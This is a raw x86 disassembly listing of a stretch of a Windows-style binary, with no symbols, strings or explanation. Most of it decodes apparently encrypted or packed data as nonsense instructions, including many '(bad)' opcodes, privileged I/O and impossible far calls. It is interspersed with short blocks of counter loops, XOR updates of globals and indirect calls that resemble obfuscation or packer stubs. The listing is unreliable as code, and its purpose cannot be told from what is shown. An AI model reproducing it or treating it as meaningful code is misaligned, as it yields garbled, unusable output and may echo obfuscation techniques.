  406c47:	xchg   edi,eax
  406c48:	into   
  406c49:	retf   
  406c4a:	mov    dh,0x53
  406c4c:	push   eax
  406c4d:	addr16 pop es
  406c4f:	rcl    BYTE PTR [ecx+0x5d2ba563],1
  406c55:	fcom   QWORD PTR [esi+0x65e6bac1]
  406c5b:	imul   ebx,DWORD PTR es:[esi],0x23
  406c5f:	rol    esp,1
  406c61:	aam    0x49
  406c63:	ror    dh,1
  406c65:	inc    ebx
  406c66:	lds    esi,FWORD PTR [eax+0x6a4c0476]
  406c6c:	fnstenv [ecx*4-0x4d92ab6e]
  406c73:	imul   BYTE PTR [eax-0x71]
  406c76:	lods   eax,DWORD PTR ds:[esi]
  406c77:	adc    dh,0xdb
  406c7a:	jae    0x406cac
  406c7c:	sbb    cl,BYTE PTR [esp+edx*4-0x1be56d77]
  406c83:	rcl    BYTE PTR [esi-0x38],cl
  406c86:	setns  BYTE PTR [ecx]
  406c89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c8a:	sub    DWORD PTR [esi],edi
  406c8c:	push   edx
  406c8d:	out    dx,eax
  406c8e:	stc    
  406c8f:	je     0x406c8e
  406c91:	dec    edi
  406c92:	xchg   edi,eax
  406c93:	add    ebx,DWORD PTR [edx-0x29]
  406c96:	xchg   BYTE PTR [edi-0x3fb16c27],ah
  406c9c:	scas   eax,DWORD PTR es:[edi]
  406c9d:	xor    bh,dh
  406c9f:	xchg   edi,eax
  406ca0:	jne    0x406c33
  406ca2:	cli    
  406ca3:	sbb    ebp,DWORD PTR ds:0x3264806b
  406ca9:	pop    ebx
  406caa:	imul   BYTE PTR [ebp-0x10ab8649]
  406cb0:	test   al,0x46
  406cb2:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  406cb4:	xchg   esi,eax
  406cb5:	in     al,dx
  406cb6:	jecxz  0x406d20
  406cb8:	not    cl
  406cba:	sbb    BYTE PTR [ebx+esi*4+0x76],0x74
  406cbf:	popa   
  406cc0:	hlt    
  406cc1:	adc    dl,BYTE PTR [ebp+0x36]
  406cc4:	or     BYTE PTR [edx],bh
  406cc6:	lds    eax,FWORD PTR [ebx-0x7205d572]
  406ccc:	jmp    0x4a6e8db
  406cd1:	mov    DWORD PTR [eax],ecx
  406cd3:	xchg   DWORD PTR [edi-0x35eb5776],ebp
  406cd9:	push   0xffffffbe
  406cdb:	jnp    0x406c8e
  406cdd:	call   0x6070:0x4b8f67b9
  406ce4:	cld    
  406ce5:	sar    BYTE PTR [esi+0x5a],cl
  406ce8:	push   ss
  406ce9:	js     0x406cee
  406ceb:	dec    eax
  406cec:	das    
  406ced:	adc    DWORD PTR [eax+0x5d],ebp
  406cf0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406cf1:	mov    WORD PTR es:[edi+0xb],?
  406cf5:	or     dl,0xda
  406cf8:	xchg   edx,eax
  406cf9:	jg     0x406cd6
  406cfb:	imul   ebx,ecx,0xfffffff1
  406cfe:	sub    BYTE PTR [ebx+0xd],ch
  406d01:	inc    esp
  406d02:	jae    0x406d6a
  406d04:	adc    al,0xca
  406d06:	cmp    al,BYTE PTR [esi+0x4717c8c8]
  406d0c:	xor    eax,0x209fddb4
  406d11:	in     eax,dx
  406d12:	jecxz  0x406d75
  406d14:	sub    edx,eax
  406d16:	retf   0x5f25
  406d19:	loop   0x406d2d
  406d1b:	retf   
  406d1c:	enter  0xaedf,0x93
  406d20:	fisub  WORD PTR [ebx]
  406d22:	cs inc edi
  406d24:	adc    eax,0xb0354a63
  406d29:	(bad)
  406d2d:	into   
  406d2e:	sbb    eax,0xcaec4e88
  406d33:	push   ebp
  406d34:	xor    BYTE PTR [ecx],bh
  406d36:	in     al,dx
  406d37:	xchg   DWORD PTR [ecx-0x795cab59],ebp
  406d3d:	xchg   ecx,eax
  406d3e:	cmp    al,0xda
  406d40:	xor    DWORD PTR [edi+0x3835cdc8],edi
  406d46:	mov    eax,ds:0xb07a05b3
  406d4b:	arpl   WORD PTR [ebp-0x79],si
  406d4e:	jbe    0x406cf1
  406d50:	xchg   edi,eax
  406d51:	pop    eax
  406d52:	lods   eax,DWORD PTR ds:[esi]
  406d53:	jg     0x406cf9
  406d55:	pop    edi
  406d56:	daa    
  406d57:	xor    bh,BYTE PTR [esi+ebp*2+0xde08c7f]
  406d5e:	rcr    DWORD PTR [edi],cl
  406d60:	(bad)  
  406d61:	out    dx,eax
  406d62:	aam    0xd4
  406d64:	mov    edi,0x4b8f91eb
  406d69:	or     cl,bh
  406d6b:	cmp    esi,DWORD PTR [esi]
  406d6d:	and    DWORD PTR [ebp+0x7d],ebp
  406d70:	xchg   ebx,eax
  406d71:	pop    esi
  406d72:	je     0x406d6b
  406d74:	mov    edi,0x26fc3e8a
  406d79:	xlat   BYTE PTR ds:[ebx]
  406d7a:	loope  0x406db6
  406d7c:	jnp    0x406d14
  406d7e:	dec    ebp
  406d7f:	adc    bl,BYTE PTR ss:[ecx+ecx*4+0x7a]
  406d84:	sbb    al,0x96
  406d86:	pop    esi
  406d87:	mov    cl,0xda
  406d89:	retf   
  406d8a:	es jg  0x406de6
  406d8d:	push   cs
  406d8e:	(bad)  
  406d8f:	shl    bh,cl
  406d91:	mov    eax,ds:0x17f3cb78
  406d96:	stc    
  406d97:	inc    ebx
  406d98:	jmp    0x3c8e66b
  406d9d:	rol    DWORD PTR [ecx+0x43035f25],1
  406da3:	add    BYTE PTR [eax],al
  406da5:	add    BYTE PTR [eax],al
  406da7:	add    BYTE PTR [ebx+0x43035f3d],cl
  406dad:	add    BYTE PTR [edi-0x77],al
  406db0:	cmp    eax,0x43035f
  406db5:	cmp    DWORD PTR ds:0x43035f,0xa
  406dbc:	jne    0x406dcb
  406dc2:	push   DWORD PTR [ebp-0x1c]
  406dc5:	call   DWORD PTR ds:0x42eaa3
  406dcb:	cmp    DWORD PTR ds:0x43035f,0x9
  406dd2:	jne    0x406de7
  406dd8:	xor    edi,edi
  406dda:	or     edi,DWORD PTR ds:0x43035f
  406de0:	inc    edi
  406de1:	mov    DWORD PTR ds:0x43035f,edi
  406de7:	cmp    DWORD PTR ds:0x43035f,0x19
  406dee:	jb     0x406da8
  406df4:	xor    DWORD PTR ds:0x42e640,edx
  406dfa:	jmp    0x406fab
  406dff:	xchg   BYTE PTR [ebx+0x34],bl
  406e02:	sahf   
  406e03:	icebp  
  406e04:	jno    0x406d9a
  406e06:	arpl   WORD PTR [ecx+0x67b88485],si
  406e0c:	lahf   
  406e0d:	xor    BYTE PTR [edi],0xf1
  406e10:	cmp    BYTE PTR [esi+0x7e],bh
  406e13:	mov    bh,BYTE PTR [edi+0x7e]
  406e16:	jle    0x406da0
  406e18:	inc    edi
  406e19:	clc    
  406e1a:	jmp    0xb21bb473
  406e1f:	push   ebx
  406e20:	fsubr  QWORD PTR [eax]
  406e22:	lock repz sar BYTE PTR [ebx+0x10cdcd13],1
  406e2a:	pushf  
  406e2b:	xchg   ecx,eax
  406e2c:	sbb    dh,al
  406e2e:	cmp    edi,0x74bca11c
  406e34:	or     al,0xfe
  406e36:	mov    esp,0x3a796227
  406e3b:	pusha  
  406e3c:	mov    eax,ds:0x9af6d89a
  406e41:	lea    ebp,[ebx+0x42]
  406e44:	ror    esp,0xc2
  406e47:	shl    BYTE PTR [ebx-0x79df458c],cl
  406e4d:	push   0xffffffee
  406e4f:	cmp    al,0xd3
  406e51:	scas   eax,DWORD PTR es:[edi]
  406e52:	ret    0x7dca
  406e55:	inc    DWORD PTR [edx+0x76]
  406e58:	sbb    ecx,esp
  406e5a:	jmp    0x406e06
  406e5c:	aad    0x19
  406e5e:	imul   DWORD PTR [ecx+ebp*2-0x7afd6e03]
  406e65:	xchg   esi,eax
  406e66:	sub    dl,BYTE PTR [ebx+0x2d54ea0a]
  406e6c:	imul   cx,ax,0xffd1
  406e70:	xor    dh,BYTE PTR [ecx-0x5d6679ad]
  406e76:	test   eax,0x1dbfb934
  406e7b:	sub    eax,0x59c9a17e
  406e80:	xchg   edi,eax
  406e81:	rcl    DWORD PTR [edi+0xf],cl
  406e84:	inc    esp
  406e85:	lods   al,BYTE PTR ds:[esi]
  406e86:	jp     0x406eef
  406e88:	(bad)  
  406e89:	frstpm(287 only) 
  406e8b:	(bad)  
  406e8c:	retf   
  406e8d:	push   ss
  406e8e:	xlat   BYTE PTR ds:[ebx]
  406e8f:	or     BYTE PTR [eax],dh
  406e91:	lds    esp,FWORD PTR [ebp-0x10]
  406e94:	shr    dh,1
  406e96:	mov    ah,0xf2
  406e98:	sub    dh,bl
  406e9a:	hlt    
  406e9b:	loope  0x406e8c
  406e9d:	rol    DWORD PTR [edx+0x3df971c6],cl
  406ea3:	fdivr  DWORD PTR [eax-0x10588118]
  406ea9:	mov    ?,WORD PTR [edi+esi*2-0x5f]
  406ead:	push   edi
  406eae:	mov    ecx,0xe120bd75
  406eb3:	fst    DWORD PTR [eax+0x63]
  406eb6:	shl    BYTE PTR [ebp-0xf409f68],1
  406ebc:	fimul  WORD PTR [esi+0x63]
  406ebf:	scas   al,BYTE PTR es:[edi]
  406ec0:	push   ss
  406ec1:	sub    eax,0xd98b14a8
  406ec6:	(bad)  
  406ec7:	mov    dh,0x91
  406ec9:	cmp    eax,0x9d8ee4fc
  406ece:	lahf   
  406ecf:	inc    edi
  406ed0:	das    
  406ed1:	mov    dh,0xc8
  406ed3:	or     edi,DWORD PTR [eax]
  406ed5:	xchg   edx,eax
  406ed6:	stos   DWORD PTR es:[edi],eax
  406ed7:	popa   
  406ed8:	mov    edx,0xde9dff4
  406edd:	add    ch,BYTE PTR [edx-0x3f71e82a]
  406ee3:	and    ebp,edi
  406ee5:	fucomp st(4)
  406ee7:	mov    ah,0xf5
  406ee9:	fdivr  st(2),st
  406eeb:	push   cs
  406eec:	fimul  DWORD PTR [ebx]
  406eee:	pop    esi
  406eef:	das    
  406ef0:	fdivr  DWORD PTR [edi]
  406ef2:	dec    esp
  406ef3:	xchg   esp,eax
  406ef4:	or     edi,ebp
  406ef6:	shl    DWORD PTR [ecx+ecx*1],1
  406ef9:	adc    DWORD PTR [edx-0x59e389b0],ecx
  406eff:	scas   al,BYTE PTR es:[edi]
  406f00:	lods   al,BYTE PTR ds:[esi]
  406f01:	adc    eax,0x71d289b6
  406f06:	and    BYTE PTR [edx+0x15188802],ch
  406f0c:	sub    al,0xec
  406f0e:	(bad)  
  406f0f:	xor    eax,0xd1d61ba5
  406f14:	pop    esi
  406f15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f16:	xor    eax,DWORD PTR [edi+edx*4-0x38]
  406f1a:	push   ecx
  406f1b:	cdq    
  406f1c:	retf   0x5ae4
  406f1f:	cmp    eax,0x1d40d089
  406f24:	dec    eax
  406f25:	mov    ch,bh
  406f27:	push   0xce0bd191
  406f2c:	push   ebx
  406f2d:	dec    ebx
  406f2e:	adc    ebx,DWORD PTR [ebp+0x6234e920]
  406f34:	cmp    eax,0x7c5ca12d
  406f39:	ror    ebp,cl
  406f3b:	data16 xchg BYTE PTR [edx],cl
  406f3e:	dec    edi
  406f3f:	mov    bh,0x80
  406f41:	push   esp
  406f42:	jle    0x406f40
  406f44:	repnz xchg edx,eax
  406f46:	or     eax,0x319370c4
  406f4b:	push   ds
  406f4c:	mov    bl,0xf1
  406f4e:	cdq    
  406f4f:	sub    edx,DWORD PTR [eax]
  406f51:	push   ecx
  406f52:	(bad)  
  406f53:	or     al,0x95
  406f55:	aad    0x1b
  406f57:	fdiv   DWORD PTR [esp+edx*4-0x39]
  406f5b:	xchg   ebx,eax
  406f5c:	mov    ds:0xe595d3ac,eax
  406f61:	ins    BYTE PTR es:[edi],dx
  406f62:	imul   ebx,esp,0x3a
  406f65:	mov    al,ds:0x2b64d1c
  406f6a:	cmp    eax,0x45296e34
  406f6f:	dec    ebx
  406f70:	ret    0xdf2e
  406f73:	push   ecx
  406f74:	mov    al,0x1c
  406f76:	add    ecx,DWORD PTR [edx]
  406f78:	pop    eax
  406f79:	cmp    al,0xd9
  406f7b:	pop    ebx
  406f7c:	mov    dh,0x5a
  406f7e:	sbb    al,0x4e
  406f80:	mov    bh,0xe2
  406f82:	inc    ebx
  406f83:	push   eax
  406f84:	mov    cl,0xb5
  406f86:	not    DWORD PTR [esi+0x42]
  406f89:	pop    ecx
  406f8a:	ins    DWORD PTR es:[edi],dx
  406f8b:	cdq    
  406f8c:	jecxz  0x406fb1
  406f8e:	jno    0x406fcb
  406f90:	inc    eax
  406f91:	dec    ebp
  406f92:	call   0x8b44:0x380dc9d
  406f99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f9a:	das    
  406f9b:	daa    
  406f9c:	retf   0x1564
  406f9f:	inc    BYTE PTR [ebp+0x694ee593]
  406fa5:	mov    bl,0xb5
  406fa7:	mov    ebp,0x89816887
  406fac:	push   ebp
  406fad:	clc    
  406fae:	mov    edx,DWORD PTR [ebp+0x8]
  406fb1:	xor    edi,DWORD PTR ds:0x4302e5
  406fb7:	xor    edx,eax
  406fb9:	add    edx,ecx
  406fbb:	xor    DWORD PTR ds:0x4302c5,edi
  406fc1:	jmp    0x407172
  406fc6:	sub    DWORD PTR [ebx],ecx
  406fc8:	fnstsw WORD PTR [esi]
  406fca:	fucomp st(0)
  406fcc:	sub    ecx,ebp
  406fce:	cmp    DWORD PTR ds:0xbad43d82,edx
  406fd4:	mov    bl,0x7a
  406fd6:	or     eax,0x8a7e7ec6
  406fdb:	jg     0x40705b
  406fdd:	jle    0x406fb5
  406fdf:	out    dx,eax
  406fe0:	add    ebp,DWORD PTR [ecx+0x6c]
  406fe3:	adc    BYTE PTR [edx-0x3b6957f],dh
  406fe9:	pop    ds
  406fea:	add    cl,ah
  406fec:	bound  esi,QWORD PTR [ebp-0x233a9bfb]
  406ff2:	cli    
  406ff3:	stos   DWORD PTR es:[edi],eax
  406ff4:	mov    dl,0x65
  406ff6:	enter  0x5cc2,0xae
  406ffa:	cmp    edi,esp
  406ffc:	add    esp,ebx
  406ffe:	cmp    DWORD PTR [esi],0x1e532dfa
  407004:	jmp    0x40704e
  407006:	jb     0x407029
  407008:	mov    ebx,0xfddf0b99
  40700d:	mov    esi,0x2e5c5ea5
  407012:	fnstcw WORD PTR ds:0x91c869b8
  407018:	in     eax,0xf0
  40701a:	pop    esp
  40701b:	push   es
  40701c:	mov    ds:0xaa9c2c22,eax
  407021:	sbb    DWORD PTR [ebx+0xe],0x57
  407025:	ret    
  407026:	mov    eax,0xe86deef5
  40702b:	add    BYTE PTR [ebx],0x18
  40702e:	or     al,0xb4
  407030:	jle    0x407049
  407032:	fst    QWORD PTR [eax]
  407034:	jg     0x407015
  407036:	ss in  al,0x15
  407039:	pop    edi
  40703a:	aaa    
  40703b:	dec    edx
  40703c:	inc    ecx
  40703d:	fs repnz aas 
  407040:	mov    eax,ds:0xb8e53828
  407045:	stos   BYTE PTR es:[edi],al
  407046:	int3   
  407047:	mov    edi,0x7af5a1bb
  40704c:	dec    ebx
  40704d:	rcl    DWORD PTR [edi+0x77],1
  407050:	add    DWORD PTR [ecx],ecx
  407052:	or     DWORD PTR [esi+0x6f],esi
  407055:	add    edx,0x35196117
  40705b:	repz xor eax,eax
  40705e:	inc    ecx
  40705f:	sti    
  407060:	jp     0x4070dc
  407062:	fist   WORD PTR [ebx+edi*4-0x6b]
  407066:	mov    ebx,eax
  407068:	adc    esp,0x9bcb7774
  40706e:	sub    edi,edx
  407070:	jne    0x4070cb
  407072:	loop   0x407096
  407074:	push   edx
  407076:	mov    esp,0x1a6cfde7
  40707b:	dec    ebp
  40707c:	mov    WORD PTR [edx-0x6f],ds
  40707f:	pop    edx
  407080:	ss sti 
  407082:	lahf   
  407083:	mov    ds:0x347a34e7,al
  407088:	add    BYTE PTR [esi-0x3bd443f3],0x4e
  40708f:	daa    
  407090:	in     ax,0x21
  407093:	cwde   
  407094:	jl     0x407049
  407096:	adc    al,0x5d
  407098:	push   ebp
  407099:	jmp    0xe53:0x82fbf562
  4070a0:	mov    ch,0x9f
  4070a2:	cs pop ebx
  4070a4:	pushf  
  4070a5:	mov    edx,0x2017d30b
  4070aa:	adc    DWORD PTR [esi+edx*8-0x232d2f5b],eax
  4070b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4070b2:	sub    al,0x3
  4070b4:	enter  0x5819,0xe5
  4070b8:	loope  0x407116
  4070ba:	jbe    0x4070ab
  4070bc:	mov    dl,0x66
  4070be:	sub    DWORD PTR [edx],ebp
  4070c0:	push   ebx
  4070c1:	dec    esi
  4070c2:	pushf  
  4070c3:	dec    edx
  4070c4:	(bad)  
  4070c6:	pop    ebp
  4070c7:	hlt    
  4070c8:	stos   BYTE PTR es:[edi],al
  4070c9:	fidivr WORD PTR [esi]
  4070cb:	stos   BYTE PTR es:[edi],al
  4070cc:	rcr    ecx,0xe4
  4070cf:	loopne 0x4070d6
  4070d1:	into   
  4070d2:	sti    
  4070d3:	pop    edi
  4070d4:	adc    eax,0x659a5af1
  4070d9:	cmp    DWORD PTR [edx-0x3a],ecx
  4070dc:	inc    edx
  4070dd:	xor    edi,DWORD PTR [edi+0x4155f446]
  4070e3:	call   0xfcc3aba1
  4070e8:	dec    esp
  4070e9:	pop    es
  4070ea:	push   0x51993798
  4070ef:	int    0x1
  4070f1:	jp     0x40711c
  4070f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4070f4:	mov    cl,0x3
  4070f6:	scas   al,BYTE PTR es:[edi]
  4070f7:	(bad)  
  4070f8:	fnstenv [ecx+0x4ec86619]
  4070fe:	out    dx,eax
  4070ff:	fdivr  st(6),st
  407101:	test   BYTE PTR [ecx],dl
  407103:	ss inc esi
  407105:	enter  0xd34,0x91
  407109:	xor    DWORD PTR [eax-0x5f937373],ebp
  40710f:	pop    ecx
  407110:	xchg   ecx,eax
  407111:	rol    BYTE PTR [esi-0x47],0x3e
  407115:	cmp    dh,BYTE PTR [esi-0x431954d8]
  40711b:	ret    0x4a
  40711e:	pop    esi
  40711f:	or     BYTE PTR [eax],0xd7
  407122:	cld    
  407123:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407124:	and    al,0x13
  407126:	pop    ebp
  407127:	daa    
  407128:	(bad)  
  407129:	jecxz  0x4070ed
  40712b:	lea    eax,[ebx-0x6b]
  40712e:	ret    0xef98
  407131:	xchg   esp,eax
  407132:	push   edi
  407133:	pop    ds
  407134:	(bad)  
  407135:	cs push 0x4e
  407138:	mov    eax,ds:0x901d6fab
  40713d:	(bad)  
  40713e:	mov    eax,0xbc3dd8b5
  407143:	mov    ecx,DWORD PTR [ecx]
  407145:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407146:	dec    edi
  407147:	dec    esi
  407148:	xchg   ebx,eax
  407149:	xchg   edi,eax
  40714a:	sahf   
  40714b:	push   cs
  40714c:	push   0xffffff8f
  40714e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40714f:	adc    al,0x36
  407151:	mov    dh,0xec
  407153:	stos   DWORD PTR es:[edi],eax
  407154:	daa    
  407155:	imul   esi,DWORD PTR gs:[esi+ebp*1-0x15],0xdc160d0
  40715e:	mov    ds:0x648f26a,eax
  407163:	mov    dh,0x7d
  407165:	pop    eax
  407166:	and    ebx,eax
  407168:	stc    
  407169:	daa    
  40716a:	push   ebx
  40716b:	loopne 0x407197
  40716d:	sar    DWORD PTR [esi],0x8c
  407170:	iret   
  407171:	cdq    
  407172:	mov    DWORD PTR [ebp+0xc],edx
  407175:	and    DWORD PTR ds:0x42e640,0x0
  40717f:	jmp    0x407191
  407184:	mov    edi,DWORD PTR ds:0x42e640
  40718a:	inc    edi
  40718b:	mov    DWORD PTR ds:0x42e640,edi
  407191:	cmp    DWORD PTR ds:0x42e640,0x1a
  407198:	jae    0x4071c1
  40719e:	cmp    DWORD PTR ds:0x42e640,0x28
  4071a5:	jne    0x4071b6
  4071ab:	push   0x716b
  4071b0:	call   DWORD PTR ds:0x42e92b
  4071b6:	jmp    0x407184
  4071bb:	and    DWORD PTR ds:0x4302e9,edi
  4071c1:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  4071c8:	adc    edi,DWORD PTR ds:0x4302cd
  4071ce:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  4071d5:	mov    DWORD PTR [ebp-0x2c],0xf89c853c
  4071dc:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  4071e3:	and    DWORD PTR ds:0x4302e1,0x0
  4071ed:	mov    edi,DWORD PTR ds:0x4302e1
  4071f3:	inc    edi
  4071f4:	mov    DWORD PTR ds:0x4302e1,edi
  4071fa:	cmp    DWORD PTR ds:0x4302e1,0x6
  407201:	jne    0x407247
  407207:	push   0x42e7a9
  40720c:	push   DWORD PTR [ebp-0x14]
  40720f:	push   0x2c1e
  407214:	push   0x5ddb
  407219:	push   DWORD PTR [ebp-0x20]
  40721c:	push   0x67ee
  407221:	push   DWORD PTR [ebp-0x18]
  407224:	push   DWORD PTR [ebp-0x24]
  407227:	push   DWORD PTR [ebp-0x14]
  40722a:	push   0x21a8
  40722f:	push   0x81f6
  407234:	push   0x1b91
  407239:	push   0x8bde
  40723e:	push   DWORD PTR [ebp-0x28]
  407241:	call   DWORD PTR ds:0x42e92f
  407247:	cmp    DWORD PTR ds:0x4302e1,0x5
  40724e:	jne    0x407261
  407254:	mov    edi,DWORD PTR ds:0x4302e1
  40725a:	inc    edi
  40725b:	mov    DWORD PTR ds:0x4302e1,edi
  407261:	cmp    DWORD PTR ds:0x4302e1,0x12
  407268:	jb     0x4071ed
  40726e:	mov    DWORD PTR [ebp-0x34],0xf89c853e
  407275:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40727c:	mov    DWORD PTR [ebp-0x3c],0xf89c8538
  407283:	mov    edx,DWORD PTR [ebp+0x8]
  407286:	xor    edi,edi
  407288:	add    edi,DWORD PTR ds:0x42e63c
  40728e:	or     DWORD PTR ds:0x4302e5,edi
  407294:	jmp    0x407445
  407299:	mov    edx,0xad140ee9
  40729e:	icebp  
  40729f:	inc    eax
  4072a0:	jno    0x4072e6
  4072a2:	mov    eax,ds:0xa3af3f15
  4072a7:	ss stos DWORD PTR es:[edi],eax
  4072a9:	cdq    
  4072aa:	(bad)  
  4072ab:	jle    0x40732b
  4072ad:	mov    bh,BYTE PTR [edi+0x7e]
  4072b0:	jle    0x4072ba
  4072b2:	hlt    
  4072b3:	jle    0x40731d
  4072b5:	in     al,0x1c
  4072b7:	cld    
  4072b8:	cmp    DWORD PTR [ebp-0x41],esp
  4072bb:	in     al,0x79
  4072bd:	fdivr  QWORD PTR [ebx-0x42]
  4072c0:	lock mov ah,0x86
  4072c3:	pop    ds
  4072c4:	cdq    
  4072c5:	imul   esi,DWORD PTR [eax],0xfffffff5
  4072c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4072c9:	aas    
  4072ca:	(bad)  
  4072cb:	push   ebx
  4072cc:	push   esp
  4072cd:	arpl   WORD PTR [ebx+0x2a],si
  4072d0:	xor    ah,cl
  4072d2:	xor    BYTE PTR [ecx],cl
  4072d4:	and    edx,DWORD PTR ds:[ecx-0x77]
  4072d8:	dec    ebp
  4072d9:	and    cl,BYTE PTR [esi-0x229a4364]
  4072df:	and    al,0x71
  4072e1:	call   0xbc9a8d02
  4072e6:	mov    fs,WORD PTR [ebx-0x6e]
  4072e9:	dec    ecx
  4072ea:	cmc    
  4072eb:	out    0x53,al
  4072ed:	jecxz  0x40734d
  4072ef:	test   DWORD PTR [ebx+0x6c],esi
  4072f2:	or     eax,0xdda0e7a6
  4072f7:	dec    ebx
  4072f8:	inc    ebp
  4072f9:	xchg   edi,eax
  4072fa:	and    ebp,DWORD PTR [edi+0x7762dce1]
  407300:	xchg   ebp,eax
  407301:	icebp  
  407302:	jae    0x4072da
  407304:	shl    DWORD PTR [edx-0x5888f2bd],1
  40730a:	scas   eax,DWORD PTR es:[edi]
  40730b:	cmc    
  40730c:	add    ebp,DWORD PTR [esi+esi*2+0x78ef6627]
  407313:	dec    edi
  407314:	pusha  
  407315:	or     al,0x1f
  407317:	cmp    BYTE PTR ds:0x2613e241,0x66
  40731e:	repnz ss pop edi
  407321:	ret    
  407322:	call   0x109bcc3d
  407327:	pushf  
  407328:	push   esi
  407329:	mov    eax,0x477d22f5
  40732e:	and    al,0x41
  407330:	mov    WORD PTR [ecx],gs
  407332:	jae    0x407309
  407334:	and    eax,0x8804f234
  407339:	mov    edi,0xf38e8834
  40733e:	or     esp,ebp
  407340:	dec    esi
  407341:	mov    edx,0x6896cb88
  407346:	and    bl,BYTE PTR [ebx-0x7b2ca825]
  40734c:	sbb    ebx,DWORD PTR [edi]
  40734e:	retf   
  40734f:	add    eax,0xa48f65f
  407354:	inc    ecx
  407355:	(bad)  
  407356:	cmp    eax,0x709cebb3
  40735b:	jmp    0x892:0x3a606a64
  407362:	or     ebp,DWORD PTR [esi+edi*8-0x68632e9c]
  407369:	in     eax,dx
  40736a:	or     bl,bh
  40736c:	cwde   
  40736d:	or     ecx,ecx
  40736f:	mov    ebp,0xf39c865
  407374:	cli    
  407375:	dec    edx
  407376:	jnp    0x4073df
  407378:	mov    ch,0xfe
  40737a:	inc    ecx
  40737b:	push   ebx
  40737c:	iret   
  40737d:	adc    edi,DWORD PTR [ebx+0x2a]
  407380:	call   0x672d:0x5149596
  407387:	pop    ebp
  407388:	mov    edi,0xcf5729ee
  40738d:	and    al,0x95
  40738f:	bound  esi,QWORD PTR [ebx]
  407391:	or     al,0x28
  407393:	rol    ebp,1
  407395:	mov    al,0x75
  407397:	(bad)
  40739c:	mul    bl
  40739e:	test   eax,0xc2b42435
  4073a3:	sbb    edx,DWORD PTR [ebx]
  4073a5:	outs   dx,DWORD PTR ds:[esi]
  4073a6:	cmc    
  4073a7:	scas   eax,DWORD PTR es:[edi]
  4073a8:	xor    al,dh
  4073aa:	(bad)  
  4073ac:	push   ebx
  4073ad:	ret    0x313e
  4073b0:	sbb    cl,BYTE PTR [ecx-0x6ecc1e3f]
  4073b6:	mov    BYTE PTR [edx],bh
  4073b8:	mov    ebp,0x1f0d4ae4
  4073bd:	sahf   
  4073be:	int3   
  4073bf:	add    al,0x5b
  4073c1:	mov    al,ds:0xa9206aa5
  4073c6:	and    bh,BYTE PTR [edi+0x235b1377]
  4073cc:	lds    esp,FWORD PTR [ebx+0x7a]
  4073cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4073d0:	sub    eax,0x73f8e96a
  4073d5:	retf   0x85c3
  4073d8:	pop    eax
  4073d9:	fwait
  4073da:	ja     0x407378
  4073dc:	pop    esi
  4073dd:	aaa    
  4073de:	fsub   QWORD PTR [edi-0x5be1ef9c]
  4073e4:	mov    dl,0x4
  4073e6:	ins    DWORD PTR es:[edi],dx
  4073e7:	lods   eax,DWORD PTR ds:[esi]
  4073e8:	xchg   DWORD PTR [esi+0x67],eax
  4073eb:	out    dx,eax
  4073ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4073ed:	loopne 0x4073af
  4073ef:	call   0x2e50:0x69eb48ca
  4073f6:	lahf   
  4073f7:	in     al,dx
  4073f8:	mov    ah,0x30
  4073fa:	lods   al,BYTE PTR ds:[esi]
  4073fb:	call   0x1cc1:0xb9523476
  407402:	mov    ecx,0x503a1378
  407407:	pop    ss
  407408:	pop    esp
  407409:	inc    ecx
  40740a:	cmp    edx,ecx
  40740c:	inc    edx
  40740d:	stos   BYTE PTR es:[edi],al
  40740e:	push   edi
  40740f:	sbb    eax,0x4c03536b
  407414:	imul   ebx,DWORD PTR [ebx+ecx*4-0xd62f9a0],0x10b19ce
  40741f:	lea    esi,[ebp+0x1b71ec5e]
  407425:	inc    esi
  407426:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407427:	nop
  407428:	adc    DWORD PTR [esi],edi
  40742a:	cmp    al,0xc2
  40742c:	add    ebx,DWORD PTR [ecx]
  40742e:	retf   
  40742f:	push   ecx
  407430:	cmp    ch,BYTE PTR ds:0x2fbbce26
  407436:	and    esp,ebp
  407438:	retf   0x6ad2
  40743b:	mov    ah,0x1a
  40743d:	mov    ecx,0xa09408b3
  407442:	mov    ds:0xd0335508,al
  407447:	mov    edi,DWORD PTR [ebp-0x10]
  40744a:	or     DWORD PTR ds:0x430357,0x71a5
  407454:	add    edx,ecx
  407456:	mov    DWORD PTR ds:0x4302c9,0x5a49
  407460:	cmp    edi,edx
  407462:	mov    DWORD PTR ds:0x43034f,0x6748
  40746c:	jmp    0x40761d
  407471:	not    DWORD PTR [ebp+edx*8-0xca68ae7]
  407478:	push   eax
  407479:	jb     0x4074d4
  40747b:	out    dx,eax
  40747c:	or     ah,cl
  40747e:	icebp  
  40747f:	inc    edx
  407480:	jle    0x4074b7
  407482:	lds    edi,FWORD PTR [esi+0x7e]
  407485:	mov    bh,BYTE PTR [edi+0x7e]
  407488:	jle    0x40747d
  40748a:	popa   
  40748b:	and    ch,BYTE PTR [edx]
  40748d:	mov    dl,0x93
  40748f:	outs   dx,DWORD PTR ds:[esi]
  407490:	push   es
  407491:	sbb    esp,ebx
  407493:	xchg   ebx,eax
  407494:	mov    bh,0x84
  407496:	mov    edi,0x70545b11
  40749b:	call   0x8dfa7bbd
  4074a0:	shl    BYTE PTR [ebp-0x4de56f18],1
  4074a6:	popf   
  4074a7:	push   ebx
  4074a8:	push   edx
  4074a9:	push   esp
  4074aa:	sub    al,BYTE PTR [eax-0x7f636ac6]
  4074b0:	cmp    DWORD PTR [edi+0x3c],edi
  4074b3:	loope  0x407455
  4074b5:	stos   DWORD PTR es:[edi],eax
  4074b6:	mov    DWORD PTR [edx],0xc4218ee0
